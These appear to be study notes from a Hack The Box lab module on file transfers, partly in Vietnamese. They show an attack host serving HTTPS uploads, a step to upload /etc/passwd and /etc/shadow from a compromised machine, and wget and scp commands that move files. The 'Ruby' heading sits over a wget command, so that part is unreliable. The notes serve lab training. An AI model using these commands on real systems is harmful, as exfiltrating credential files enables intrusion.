    -----
  
Pwnbox - Start Web Server

  naruto3co@htb[/htb]$ mkdir https && cd https

  naruto3co@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
    File upload available at /upload
    Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...

Bây giờ, từ máy tính bị xâm nhập, hãy tải lên các tệp /etc/passwd và /etc/shadow.
We used the option --insecure because we used a self-signed certificate that we trust.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Alternative Web File Transfer Method

Việc khởi động python rất dễ ở linux vì nó hay có sẵn 
Linux - Creating a Web Server with Python3
  naruto3co@htb[/htb]$ python3 -m http.server
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Linux - Creating a Web Server with Python2.7
  naruto3co@htb[/htb]$ python2.7 -m SimpleHTTPServer
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Linux - Creating a Web Server with PHP
  naruto3co@htb[/htb]$ php -S 0.0.0.0:8000
  [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started

Linux - Creating a Web Server with Ruby
  naruto3co@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
    --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
    Connecting to 192.168.49.128:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 0 [text/plain]
    Saving to: 'filetotransfer.txt'
    
    filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      
    2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]

Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

SCP Upload

We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

File Upload using SCP

  naruto3co@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
  htb-student@10.129.86.90's password: 
  passwd   

